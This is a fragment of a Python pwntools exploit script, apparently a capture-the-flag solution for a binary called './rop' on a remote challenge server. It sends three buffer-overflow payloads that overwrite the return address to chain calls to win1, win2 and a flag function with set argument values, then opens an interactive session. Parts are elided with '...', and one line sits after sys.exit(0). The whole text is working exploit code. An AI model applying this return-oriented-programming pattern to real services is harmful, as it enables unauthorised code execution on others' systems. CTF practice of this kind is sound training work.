...
target: str = './rop'
target_host = ('redirect.do-not-trust.hacking.run', 10225)
...
flaggggg_addr = elf.symbols['flag']
payload = b'a' * 24 + p32(0xdeadbeaf) + p32(win1_addr)  + p32(main_addr) 
sl(payload)
payload = b'a' * 24 + p32(0xdeadbeaf) + p32(win2_addr)  + p32(main_addr) + p32(0xBAAAAAAD)
sl(payload)
payload = b'a' * 24 + p32(0xdeadbeaf) + p32(flaggggg_addr) + p32(0xdeadbeaf) + p32(0xDEADBAAD)
sl(payload)
r.interactive()
sys.exit(0)
gamebox = ELF(target)
